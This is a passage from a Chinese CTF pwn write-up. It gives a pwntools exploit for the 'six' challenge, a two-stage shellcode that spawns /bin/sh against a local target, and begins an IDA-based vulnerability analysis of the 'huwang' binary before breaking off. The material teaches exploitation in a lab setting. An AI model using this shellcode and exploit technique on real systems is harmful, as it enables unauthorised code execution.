class="line">   <span class="number">0</span>:   <span class="number">48</span> <span class="number">89</span> fc                <span class="keyword">mov</span>    <span class="built_in">rsp</span>,<span class="built_in">rdi</span></span><br><span class="line">   <span class="number">3</span>:   <span class="number">48</span> <span class="number">31</span> ed                <span class="keyword">xor</span>    <span class="built_in">rbp</span>,<span class="built_in">rbp</span></span><br><span class="line">   <span class="number">6</span>:   <span class="number">48</span> <span class="number">31</span> c0                <span class="keyword">xor</span>    <span class="built_in">rax</span>,<span class="built_in">rax</span></span><br><span class="line">   <span class="number">9</span>:   <span class="number">48</span> <span class="number">31</span> <span class="built_in">db</span>                <span class="keyword">xor</span>    <span class="built_in">rbx</span>,<span class="built_in">rbx</span></span><br><span class="line"><span class="symbol">   c:</span>   <span class="number">48</span> <span class="number">31</span> c9                <span class="keyword">xor</span>    <span class="built_in">rcx</span>,<span class="built_in">rcx</span></span><br><span class="line"><span class="symbol">   f:</span>   <span class="number">48</span> <span class="number">31</span> d2                <span class="keyword">xor</span>    <span class="built_in">rdx</span>,<span class="built_in">rdx</span></span><br><span class="line">  <span class="number">12</span>:   <span class="number">48</span> <span class="number">31</span> ff                <span class="keyword">xor</span>    <span class="built_in">rdi</span>,<span class="built_in">rdi</span></span><br><span class="line">  <span class="number">15</span>:   <span class="number">48</span> <span class="number">31</span> f6                <span class="keyword">xor</span>    <span class="built_in">rsi</span>,<span class="built_in">rsi</span></span><br><span class="line">  <span class="number">18</span>:   <span class="number">4d</span> <span class="number">31</span> c0                <span class="keyword">xor</span>    <span class="built_in">r8</span>,<span class="built_in">r8</span></span><br><span class="line">  <span class="number">1b</span>:   <span class="number">4d</span> <span class="number">31</span> c9                <span class="keyword">xor</span>    <span class="built_in">r9</span>,<span class="built_in">r9</span></span><br><span class="line">  1e:   <span class="number">4d</span> <span class="number">31</span> d2                <span class="keyword">xor</span>    <span class="built_in">r10</span>,<span class="built_in">r10</span></span><br><span class="line">  <span class="number">21</span>:   <span class="number">4d</span> <span class="number">31</span> <span class="built_in">db</span>                <span class="keyword">xor</span>    <span class="built_in">r11</span>,<span class="built_in">r11</span></span><br><span class="line">  <span class="number">24</span>:   <span class="number">4d</span> <span class="number">31</span> e4                <span class="keyword">xor</span>    <span class="built_in">r12</span>,<span class="built_in">r12</span></span><br><span class="line">  <span class="number">27</span>:   <span class="number">4d</span> <span class="number">31</span> ed                <span class="keyword">xor</span>    <span class="built_in">r13</span>,<span class="built_in">r13</span></span><br><span class="line">  2a:   <span class="number">4d</span> <span class="number">31</span> f6                <span class="keyword">xor</span>    <span class="built_in">r14</span>,<span class="built_in">r14</span></span><br><span class="line">  <span class="number">2d</span>:   <span class="number">4d</span> <span class="number">31</span> ff                <span class="keyword">xor</span>    <span class="built_in">r15</span>,<span class="built_in">r15</span></span><br></pre></td></tr></table></figure><p>我们可以看到，src处的代码功能为，将esp指向分配的具有可执行权限的内存块，并且将其他寄存器清0。执行完上述代码，就开始执行我们输入的6字节shellcode，6个字节直接获取shell是不可能的了，所以我们换种思路。通过调用0号系统调用read，将用于获取shell交互的shellcode读入一块可执行内存中，并且调用。我们从rsp开始写入数据，一直写到rip所指向的位置，就可以执行获取shell的shellcode了。</p><p>调用read的代码如下，也就是那六个字节的shellcode。</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span>:    <span class="number">54</span>           <span class="keyword">push</span>   <span class="built_in">rsp</span></span><br><span class="line"><span class="number">1</span>:    5e           <span class="keyword">pop</span>    <span class="built_in">rsi</span></span><br><span class="line"><span class="number">2</span>:    <span class="number">89</span> f2        <span class="keyword">mov</span>    <span class="built_in">edx</span>, <span class="built_in">esi</span></span><br><span class="line"><span class="number">4</span>:    0f <span class="number">05</span>        <span class="keyword">syscall</span></span><br><span class="line"><span class="comment">;54 5e 89 f2 0f 05</span></span><br></pre></td></tr></table></figure><p>接下来获取shell的shellcode，有两种方式，一种是直接使用pwntools生成的shellcode，另一种则是调用系统调用execve(/bin/sh).由于此利用方法的局限性，并不能每次都执行成功，只有当从/dev/urandom读出的两个地址都超出0x00007FFFFFFFFFFF时，mmap才会随机分配两块内存，才能满足利用的条件。</p><h4 id="0x03-exp-1"><a href="#0x03-exp-1" class="headerlink" title="0x03 exp"></a>0x03 exp</h4><p>下面是exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.clear()</span><br><span class="line"><span class="comment"># context.log_level = 'debug'</span></span><br><span class="line">context.binary =<span class="string">'./six'</span></span><br><span class="line">context = &#123;<span class="string">'arch'</span>:<span class="string">'amd64'</span>,<span class="string">'bits'</span>:<span class="string">'64'</span>,<span class="string">'endian'</span>:<span class="string">'little'</span>,<span class="string">'os'</span>:<span class="string">'linux'</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> args[<span class="string">'REMOTE'</span>]:</span><br><span class="line">    Io = remote(<span class="string">'127.0.0.1'</span>,<span class="number">10000</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    Io = process(<span class="string">'./six'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(Io)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># send payload1</span></span><br><span class="line">payload1 = asm(<span class="string">'''</span></span><br><span class="line"><span class="string">                push rsp</span></span><br><span class="line"><span class="string">                pop  rsi</span></span><br><span class="line"><span class="string">                mov  edx,esi</span></span><br><span class="line"><span class="string">                syscall</span></span><br><span class="line"><span class="string">                '''</span>) <span class="comment"># 545e89f20f05</span></span><br><span class="line"><span class="comment"># payload1 = chr(0x54) + chr(0x5e) + chr(0x89) + chr(0xf2) + chr(0x0F) + chr(0x05)</span></span><br><span class="line">Io.recvuntil(<span class="string">'Show Ne0 your shellcode:'</span>)</span><br><span class="line">Io.send(payload1)</span><br><span class="line"></span><br><span class="line"><span class="comment"># send payload2</span></span><br><span class="line"><span class="comment"># one method of shell </span></span><br><span class="line">shell = asm(<span class="string">'''</span></span><br><span class="line"><span class="string">            mov eax,0x3b</span></span><br><span class="line"><span class="string">            mov rdi,rsi</span></span><br><span class="line"><span class="string">            add rdi,0xb4d</span></span><br><span class="line"><span class="string">            xor rdx,rdx</span></span><br><span class="line"><span class="string">            xor rsi,rsi</span></span><br><span class="line"><span class="string">            syscall</span></span><br><span class="line"><span class="string">            '''</span>) <span class="comment"># b83b0000004889f74881c74d0b00004831d24831f60f05</span></span><br><span class="line">shell += <span class="string">"/bin/sh\0"</span> <span class="comment"># 2f62696e2f736800</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># the other method of shell</span></span><br><span class="line"><span class="comment"># shell = asm(shellcraft.sh())</span></span><br><span class="line">payload2 = <span class="string">'\x90'</span>*(<span class="number">0x1000</span><span class="number">-0x500</span>+<span class="number">0x30</span>+<span class="number">0x06</span>) + shell</span><br><span class="line"></span><br><span class="line">Io.sendline(payload2)</span><br><span class="line">Io.interactive()</span><br></pre></td></tr></table></figure><h4 id="0x04-总结-1"><a href="#0x04-总结-1" class="headerlink" title="0x04 总结"></a>0x04 总结</h4><p>这道题主要考的是Linux系统下，怎么利用汇编来进行系统调用。以及使用mmap()函数，分配内存块时的策略。</p><h3 id="huwang"><a href="#huwang" class="headerlink" title="huwang"></a>huwang</h3><h4 id="0x00-file-amp-amp-checksec-2"><a href="#0x00-file-amp-amp-checksec-2" class="headerlink" title="0x00 file &amp;&amp; checksec"></a>0x00 file &amp;&amp; checksec</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$ file huwang </span><br><span class="line">huwang: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, <span class="keyword">for</span> GNU/Linux 2.6.32, BuildID[sha1]=f74d9c8c7f896833ec74d4a898784772c139878a, stripped</span><br><span class="line">$ checksec huwang</span><br><span class="line">[*] <span class="string">'/home/.../Desktop/huwang/huwang'</span></span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure><p>可以看到这是一个64bit的ELF程序，并且stripped掉了符号表。保护措施，除了PIE没有开启，也就是地址不会随机化，其他都开启了。</p><h4 id="0x01-观察程序行为-1"><a href="#0x01-观察程序行为-1" class="headerlink" title="0x01 观察程序行为"></a>0x01 观察程序行为</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line">$ ./huwang </span><br><span class="line"> _   _     __        __                ____       _ </span><br><span class="line">| | | |_   \ \      / /_ _ _ __   __ _| __ )  ___(_)</span><br><span class="line">| |_| | | | \ \ /\ / / _` | <span class="string">'_ \ / _` |  _ \ / _ \ |</span></span><br><span class="line"><span class="string">|  _  | |_| |\ V  V / (_| | | | | (_| | |_) |  __/ |</span></span><br><span class="line"><span class="string">|_| |_|\__,_| \_/\_/ \__,_|_| |_|\__, |____/ \___|_|</span></span><br><span class="line"><span class="string">                                 |___/              </span></span><br><span class="line"><span class="string">---------menu---------</span></span><br><span class="line"><span class="string">1. Add Note</span></span><br><span class="line"><span class="string">2. Delete Note</span></span><br><span class="line"><span class="string">3. Show Note</span></span><br><span class="line"><span class="string">4. Exit</span></span><br><span class="line"><span class="string">command&gt;&gt; </span></span><br><span class="line"><span class="string">3</span></span><br><span class="line"><span class="string">Sorry, an unknown error has occurred!</span></span><br><span class="line"><span class="string">---------menu---------</span></span><br><span class="line"><span class="string">1. Add Note</span></span><br><span class="line"><span class="string">2. Delete Note</span></span><br><span class="line"><span class="string">3. Show Note</span></span><br><span class="line"><span class="string">4. Exit</span></span><br><span class="line"><span class="string">command&gt;&gt; </span></span><br><span class="line"><span class="string">1</span></span><br><span class="line"><span class="string">size:5</span></span><br><span class="line"><span class="string">content:12345</span></span><br><span class="line"><span class="string">Success~</span></span><br><span class="line"><span class="string">---------menu---------</span></span><br><span class="line"><span class="string">1. Add Note</span></span><br><span class="line"><span class="string">2. Delete Note</span></span><br><span class="line"><span class="string">3. Show Note</span></span><br><span class="line"><span class="string">4. Exit</span></span><br><span class="line"><span class="string">command&gt;&gt; </span></span><br><span class="line"><span class="string">invalid choice</span></span><br><span class="line"><span class="string">---------menu---------</span></span><br><span class="line"><span class="string">1. Add Note</span></span><br><span class="line"><span class="string">2. Delete Note</span></span><br><span class="line"><span class="string">3. Show Note</span></span><br><span class="line"><span class="string">4. Exit</span></span><br><span class="line"><span class="string">command&gt;&gt; </span></span><br><span class="line"><span class="string">3</span></span><br><span class="line"><span class="string">Sorry, an unknown error has occurred!</span></span><br><span class="line"><span class="string">---------menu---------</span></span><br><span class="line"><span class="string">1. Add Note</span></span><br><span class="line"><span class="string">2. Delete Note</span></span><br><span class="line"><span class="string">3. Show Note</span></span><br><span class="line"><span class="string">4. Exit</span></span><br><span class="line"><span class="string">command&gt;&gt; </span></span><br><span class="line"><span class="string">2</span></span><br><span class="line"><span class="string">index:1</span></span><br><span class="line"><span class="string">---------menu---------</span></span><br><span class="line"><span class="string">1. Add Note</span></span><br><span class="line"><span class="string">2. Delete Note</span></span><br><span class="line"><span class="string">3. Show Note</span></span><br><span class="line"><span class="string">4. Exit</span></span><br><span class="line"><span class="string">command&gt;&gt; </span></span><br><span class="line"><span class="string">4</span></span><br></pre></td></tr></table></figure><p>可以看到，不管有没有Note,选Show Note，都显示Sorry, an unknown error has occurred!其它没什么特别的。下面我们用IDA打开来看看。</p><h4 id="0x02-IDA分析-2"><a href="#0x02-IDA分析-2" class="headerlink" title="0x02 IDA分析"></a>0x02 IDA分析</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> __fastcall __<span class="function">noreturn <span class="title">main</span><span class="params">(__int64 a1, <span class="keyword">char</span> **a2, <span class="keyword">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// eax</span></span><br><span class="line"></span><br><span class="line">  set_timer();</span><br><span class="line">  banner();</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      menu();</span><br><span class="line">      v3 = get_option_num();                    <span class="comment">// 获取选项</span></span><br><span class="line">      <span class="keyword">if</span> ( v3 != <span class="number">3</span> )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      show_note();                              <span class="comment">// 3.显示Note</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( v3 &gt; <span class="number">3</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( v3 == <span class="number">4</span> )                            <span class="comment">// 4.退出</span></span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">      <span class="keyword">if</span> ( v3 == <span class="number">666</span> )</span><br><span class="line">        option_666();                           <span class="comment">// 选项666</span></span><br><span class="line">LABEL_15:</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">"invalid choice"</span>);                   <span class="comment">// 无效的选择</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ( v3 == <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      add_note();                               <span class="comment">// 1.添加Note</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( v3 != <span class="number">2</span> )</span><br><span class="line">        <span class="keyword">goto</span> LABEL_15;</span><br><span class="line">      delete_note();                            <span class="comment">// 2.删除Note</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们可以看到，有一个选项666，并没有在菜单中出现，我们进去看一下。后面我们可以知道，除了这个666选项有用，其他选项是没用的。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> __<span class="function">noreturn <span class="title">option_666</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v0; <span class="comment">// ST04_4</span></span><br><span class="line">  __int64 v1; <span class="comment">// [rsp+0h] [rbp-80h]</span></span><br><span class="line">  __int64 v2; <span class="comment">// [rsp+0h] [rbp-80h]</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> i; <span class="comment">// [rsp+0h] [rbp-80h]</span></span><br><span class="line">  <span class="keyword">int</span> v4; <span class="comment">// [rsp+4h] [rbp-7Ch]</span></span><br><span class="line">  <span class="keyword">int</span> fd; <span class="comment">// [rsp+8h] [rbp-78h]</span></span><br><span class="line">  <span class="keyword">int</span> fda; <span class="comment">// [rsp+8h] [rbp-78h]</span></span><br><span class="line">  <span class="keyword">int</span> encrypt_nums; <span class="comment">// [rsp+Ch] [rbp-74h]</span></span><br><span class="line">  <span class="keyword">char</span> result; <span class="comment">// [rsp+10h] [rbp-70h]</span></span><br><span class="line">  <span class="keyword">char</span> s[<span class="number">32</span>]; <span class="comment">// [rsp+20h] [rbp-60h]</span></span><br><span class="line">  <span class="keyword">char</span> s1; <span class="comment">// [rsp+40h] [rbp-40h]</span></span><br><span class="line">  <span class="keyword">char</span> name; <span class="comment">// [rsp+60h] [rbp-20h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v12; <span class="comment">// [rsp+78h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v12 = __readfsqword(<span class="number">0x28</span>u);                   <span class="comment">// canary</span></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"please input your name"</span>);               <span class="comment">// 输入不超过0x20字节的名字</span></span><br><span class="line">  read(<span class="number">0</span>, &amp;name, <span class="number">0x20</span>uLL);                      <span class="comment">// 这里超过0x19字节会覆盖canary</span></span><br><span class="line">  <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="number">0x10</span>uLL);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Do you want to guess the secret?"</span>);</span><br><span class="line">  get_choose(&amp;result, <span class="number">2L</span>L);</span><br><span class="line">  <span class="keyword">if</span> ( result == <span class="string">'y'</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( access(<span class="string">"/tmp/secret"</span>, <span class="number">0</span>) == <span class="number">-1</span> )       <span class="comment">// 如果/tmp/secret不存在</span></span><br><span class="line">    &#123;</span><br><span class="line">      HIDWORD(v1) = open(<span class="string">"/tmp/secret"</span>, <span class="number">0x41</span>, <span class="number">0777L</span>L);<span class="comment">// 创建/tmp/secret文件，flags:O_CREAT(0x40)|O_WRONLY(0x01),赋予777权限</span></span><br><span class="line">      fd = open(<span class="string">"/dev/urandom"</span>, <span class="number">0</span>);             <span class="comment">// flags:O_RDONLY(0x00)</span></span><br><span class="line">      read(fd, s, <span class="number">12u</span>LL);                       <span class="comment">// 从/dev/urandom读取12字节随机数</span></span><br><span class="line">      LODWORD(v1) = <span class="number">0</span>;                          <span class="comment">// /tmp/secret文件描述符值的低32位赋0</span></span><br><span class="line">      <span class="keyword">while</span> ( (<span class="keyword">signed</span> <span class="keyword">int</span>)v1 &lt;= <span class="number">11</span> )            <span class="comment">// 有符号v1与0xB，比较，小于0xB</span></span><br><span class="line">      &#123;</span><br><span class="line">        s[(<span class="keyword">signed</span> <span class="keyword">int</span>)v1] &amp;= <span class="number">1u</span>;                <span class="comment">// 使读出的随机数每个字节的高7位为0</span></span><br><span class="line">        LODWORD(v1) = v1 + <span class="number">1</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      write(SHIDWORD(v1), s, <span class="number">12u</span>LL);            <span class="comment">// 将读出的随机数经过处理写入/tmp/secret</span></span><br><span class="line">      close(SHIDWORD(v1));</span><br><span class="line">      close(fd);</span><br><span class="line">    &#125;</span><br><span class="line">    v0 = open(<span class="string">"/tmp/secret"</span>, <span class="number">0</span>, v1);            <span class="comment">// flags:O_RDONLY(0x00)</span></span><br><span class="line">    read(v0, s, <span class="number">12u</span>LL);</span><br><span class="line">    close(v0);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Input how many rounds do you want to encrypt the secret:"</span>);</span><br><span class="line">    encrypt_nums = get_option_num();            <span class="comment">// 输入对secret加密的次数</span></span><br><span class="line">    <span class="comment">// 只判断了大于 10 和为0 的情况</span></span><br><span class="line">    <span class="keyword">if</span> ( encrypt_nums &gt; <span class="number">10</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">"What? Why do you need to encrypt so many times?"</span>);<span class="comment">// 超过10次，退出</span></span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( !encrypt_nums )                        <span class="comment">// 加密次数为0，退出</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">"At least encrypt one time"</span>, s);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    HIDWORD(v2) = open(<span class="string">"/tmp/secret"</span>, <span class="number">0x201</span>);   <span class="comment">// flags:O_TRUNC(0x200)|O_WRONLY(0x01)</span></span><br><span class="line">    LODWORD(v2) = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> ( (<span class="keyword">unsigned</span> <span class="keyword">int</span>)v2 &lt; encrypt_nums )   <span class="comment">// 当加密次数输入为-1时，v2(无符号)与encrypt_num(有符号)比较时，-1会变成一个很大的数，致使程序一直处于加密循环中</span></span><br><span class="line">    &#123;</span><br><span class="line">      MD5((__int64)s, <span class="number">16L</span>L, (__int64)s);</span><br><span class="line">      LODWORD(v2) = v2 + <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    write(SHIDWORD(v2), s, <span class="number">16u</span>LL);</span><br><span class="line">    close(SHIDWORD(v2));</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Try to guess the md5 of the secret"</span>);</span><br><span class="line">    read(<span class="number">0</span>, &amp;s1, <span class="number">16u</span>LL);                        <span class="comment">// 输入你猜测的secret的MD5值</span></span><br><span class="line">    <span class="keyword">if</span> ( !<span class="built_in">memcmp</span>(&amp;s1, s, <span class="number">16u</span>LL) )               <span class="comment">// 进行比较，相等则进入</span></span><br><span class="line">      cmp_md5_true((__int64)&amp;name);</span><br><span class="line">    <span class="comment">// 不相等，进行下列操作</span></span><br><span class="line">    v4 = open(<span class="string">"/tmp/secret"</span>, <span class="number">0x201</span>, <span class="number">0777L</span>L, v2);<span class="comment">// flags:O_TRUNC(0x200)|O_WRONLY(0x01)</span></span><br><span class="line">    fda = open(<span class="string">"/dev/urandom"</span>, <span class="number">0</span>);              <span class="comment">// flags:O_RDONLY(0x00)</span></span><br><span class="line">    read(fda, s, <span class="number">12u</span>LL);</span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">11</span>; ++i )</span><br><span class="line">      s[i] &amp;= <span class="number">1u</span>;</span><br><span class="line">    write(v4, s, <span class="number">12u</span>LL);</span><br><span class="line">    close(v4);</span><br><span class="line">    close(fda);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Oh!bye %s\n"</span>, &amp;name);</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里我们需要了解open()函数的flags的几个相关参数：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">头文件：</span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">函数原型：</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">open</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *pathname, <span class="keyword">int</span> flags, <span class="keyword">mode_t</span> mode)</span></span>;</span><br><span class="line"></span><br><span class="line">函数参数：</span><br><span class="line">*pathname：要打开的文件的路径及名称</span><br><span class="line">flags:位掩码，用于指定文件的访问模式</span><br><span class="line">mode:当调用open()创建新文件时，指定了文件的访问权限，若flags未包含O_CREAT标志，则可以省略mode参数</span><br><span class="line"></span><br><span class="line">flags:</span><br><span class="line">文件访问标志：O_RDONLY、O_WRONLY、O_RDWR,这三者不能同时使用，只能指定其中一种</span><br><span class="line">             O_RDONLY:以只读权限打开</span><br><span class="line">             O_WRONLY:以只写权限打开</span><br><span class="line">             O_RDWR:以读写权限打开</span><br><span class="line">文件创建标志：这里面只说此题中用到的O_TRUNC。</span><br><span class="line">             O_TRUNC:如果文件已经存在且为普通文件，那么将文件内容清空，将其长度置<span class="number">0.</span></span><br><span 